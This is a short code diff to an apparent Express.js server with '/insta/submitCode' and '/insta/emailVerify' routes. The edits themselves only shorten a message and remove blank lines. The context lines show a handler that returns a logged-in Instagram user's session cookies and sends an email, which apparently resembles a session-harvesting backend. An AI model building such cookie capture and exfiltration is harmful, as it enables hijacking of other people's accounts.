@@ -140,7 +140,7 @@ app.get("/insta/emailVerify", (req, res) => {
       res.json({
         success: true,
         redirect: true,
-        message: "Security code verified.Please login again to continue",
+        message: "Security code verified",
       });
       res.end();
     })
@@ -215,7 +215,6 @@ app.get("/insta/submitCode", (req, res) => {
                     console.log(error);
                     res.json({
                       success: true,
-
                       user: val,
                       cookie: JSON.stringify(val2.cookies),
                       message: "login Successful but failed to send email",
@@ -224,7 +223,6 @@ app.get("/insta/submitCode", (req, res) => {
                     console.log("Email sent: " + info.response);
                     res.json({
                       success: true,
-
                       user: val,
                       cookie: JSON.stringify(val2.cookies),
                       message: "login Successful and email has been sent.",
@@ -237,7 +235,6 @@ app.get("/insta/submitCode", (req, res) => {
                 console.log(err);
                 res.json({
                   success: true,
-
                   user: val,
                   cookie: val2.cookies,
                   message: "login Successful but failed to send email",
